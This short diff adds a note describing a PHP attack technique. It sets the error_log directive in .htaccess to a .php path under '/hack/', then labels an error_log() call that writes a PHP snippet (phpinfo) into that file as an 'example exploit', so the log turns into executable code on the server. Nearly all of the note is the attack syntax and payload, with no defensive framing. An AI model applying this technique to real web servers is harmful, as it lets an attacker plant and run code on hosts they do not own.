@@ -1,0 +1,5 @@
+syntax in .htaccess
+php_value error_log &quot;/hack/blehx.php&quot;
+
+example exploit:
+error_log(&quot;&lt;?php phpinfo(); ?&gt;&quot;, 0);
